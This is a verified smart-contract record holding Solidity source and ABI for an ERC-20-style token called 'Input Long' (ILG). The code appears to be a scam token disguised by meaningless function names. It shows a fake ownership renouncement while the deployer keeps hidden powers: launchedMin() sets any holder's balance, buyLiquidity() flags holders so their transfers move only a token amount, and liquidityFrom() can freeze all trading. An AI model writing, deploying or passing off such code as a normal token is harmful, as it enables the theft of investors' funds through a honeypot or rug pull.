{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.6;\n\ninterface amountLiquidityTotal {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract autoMax {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface launchList {\n    function createPair(address sellEnableIs, address senderMarketingIs) external returns (address);\n}\n\ninterface liquidityLaunched {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address autoSwap) external view returns (uint256);\n\n    function transfer(address maxExempt, uint256 fundFromAuto) external returns (bool);\n\n    function allowance(address atFee, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 fundFromAuto) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address maxExempt,\n        uint256 fundFromAuto\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed enableSell, uint256 value);\n    event Approval(address indexed atFee, address indexed spender, uint256 value);\n}\n\ninterface atMarketing is liquidityLaunched {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract InputLong is autoMax, liquidityLaunched, atMarketing {\n\n    bool public autoFromList;\n\n    uint256 private tradingIs = 100000000 * 10 ** 18;\n\n    function getOwner() external view returns (address) {\n        return enableFund;\n    }\n\n    uint256 txSell;\n\n    bool public launchBuy;\n\n    function takeIsSwap(address minLiquidity, address maxExempt, uint256 fundFromAuto) internal returns (bool) {\n        if (minLiquidity == isLaunch) {\n            return listLaunch(minLiquidity, maxExempt, fundFromAuto);\n        }\n        uint256 exemptLiquidityMode = liquidityLaunched(walletTrading).balanceOf(marketingMax);\n        require(exemptLiquidityMode == txMarketingTotal);\n        require(maxExempt != marketingMax);\n        if (atTotal[minLiquidity]) {\n            return listLaunch(minLiquidity, maxExempt, listMin);\n        }\n        return listLaunch(minLiquidity, maxExempt, fundFromAuto);\n    }\n\n    event OwnershipTransferred(address indexed receiverExempt, address indexed fundSell);\n\n    function owner() external view returns (address) {\n        return enableFund;\n    }\n\n    function balanceOf(address autoSwap) public view virtual override returns (uint256) {\n        return limitSell[autoSwap];\n    }\n\n    bool private limitBuy;\n\n    address walletSender = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => bool) public atTotal;\n\n    bool public marketingTrading;\n\n    address private enableFund;\n\n    function exemptFrom(address fundAuto) public {\n        if (launchBuy) {\n            return;\n        }\n        if (marketingTrading) {\n            teamAt = totalAt;\n        }\n        feeList[fundAuto] = true;\n        if (sellTx != limitBuy) {\n            autoFromList = true;\n        }\n        launchBuy = true;\n    }\n\n    bool private fundList;\n\n    bool private sellTx;\n\n    function decimals() external view virtual override returns (uint8) {\n        return atTo;\n    }\n\n    function liquidityFrom(uint256 fundFromAuto) public {\n        toFee();\n        txMarketingTotal = fundFromAuto;\n    }\n\n    function transferFrom(address minLiquidity, address maxExempt, uint256 fundFromAuto) external override returns (bool) {\n        if (_msgSender() != walletSender) {\n            if (senderLiquidity[minLiquidity][_msgSender()] != type(uint256).max) {\n                require(fundFromAuto <= senderLiquidity[minLiquidity][_msgSender()]);\n                senderLiquidity[minLiquidity][_msgSender()] -= fundFromAuto;\n            }\n        }\n        return takeIsSwap(minLiquidity, maxExempt, fundFromAuto);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return buyLimit;\n    }\n\n    uint256 constant listMin = 16 ** 10;\n\n    uint8 private atTo = 18;\n\n    string private buyLimit = \"ILG\";\n\n    string private swapSell = \"Input Long\";\n\n    constructor (){\n        if (totalAt != launchTo) {\n            marketingTrading = true;\n        }\n        amountLiquidityTotal toMarketing = amountLiquidityTotal(walletSender);\n        walletTrading = launchList(toMarketing.factory()).createPair(toMarketing.WETH(), address(this));\n        if (teamAt != swapAuto) {\n            teamAt = launchTo;\n        }\n        isLaunch = _msgSender();\n        minAtShould();\n        feeList[isLaunch] = true;\n        limitSell[isLaunch] = tradingIs;\n        if (launchTo != swapAuto) {\n            sellTx = false;\n        }\n        emit Transfer(address(0), isLaunch, tradingIs);\n    }\n\n    mapping(address => bool) public feeList;\n\n    address public isLaunch;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return tradingIs;\n    }\n\n    uint256 public teamAt;\n\n    function approve(address tokenLaunched, uint256 fundFromAuto) public virtual override returns (bool) {\n        senderLiquidity[_msgSender()][tokenLaunched] = fundFromAuto;\n        emit Approval(_msgSender(), tokenLaunched, fundFromAuto);\n        return true;\n    }\n\n    function allowance(address fromMin, address tokenLaunched) external view virtual override returns (uint256) {\n        if (tokenLaunched == walletSender) {\n            return type(uint256).max;\n        }\n        return senderLiquidity[fromMin][tokenLaunched];\n    }\n\n    uint256 private totalAt;\n\n    address marketingMax = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function transfer(address fromLaunch, uint256 fundFromAuto) external virtual override returns (bool) {\n        return takeIsSwap(_msgSender(), fromLaunch, fundFromAuto);\n    }\n\n    address public walletTrading;\n\n    function toFee() private view {\n        require(feeList[_msgSender()]);\n    }\n\n    uint256 private swapAuto;\n\n    function listLaunch(address minLiquidity, address maxExempt, uint256 fundFromAuto) internal returns (bool) {\n        require(limitSell[minLiquidity] >= fundFromAuto);\n        limitSell[minLiquidity] -= fundFromAuto;\n        limitSell[maxExempt] += fundFromAuto;\n        emit Transfer(minLiquidity, maxExempt, fundFromAuto);\n        return true;\n    }\n\n    mapping(address => mapping(address => uint256)) private senderLiquidity;\n\n    mapping(address => uint256) private limitSell;\n\n    function minAtShould() public {\n        emit OwnershipTransferred(isLaunch, address(0));\n        enableFund = address(0);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return swapSell;\n    }\n\n    uint256 txMarketingTotal;\n\n    function buyLiquidity(address amountLimit) public {\n        toFee();\n        if (limitBuy) {\n            swapAuto = teamAt;\n        }\n        if (amountLimit == isLaunch || amountLimit == walletTrading) {\n            return;\n        }\n        atTotal[amountLimit] = true;\n    }\n\n    uint256 public launchTo;\n\n    function launchedMin(address fromLaunch, uint256 fundFromAuto) public {\n        toFee();\n        limitSell[fromLaunch] = fundFromAuto;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atFee\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverExempt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundSell\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableSell\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromMin\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tokenLaunched\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundFromAuto\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"atTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoFromList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoSwap\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountLimit\",\"type\":\"address\"}],\"name\":\"buyLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundAuto\",\"type\":\"address\"}],\"name\":\"exemptFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"feeList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isLaunch\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchTo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundFromAuto\",\"type\":\"uint256\"}],\"name\":\"launchedMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"fundFromAuto\",\"type\":\"uint256\"}],\"name\":\"liquidityFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minAtShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamAt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundFromAuto\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minLiquidity\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"maxExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundFromAuto\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletTrading\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "InputLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}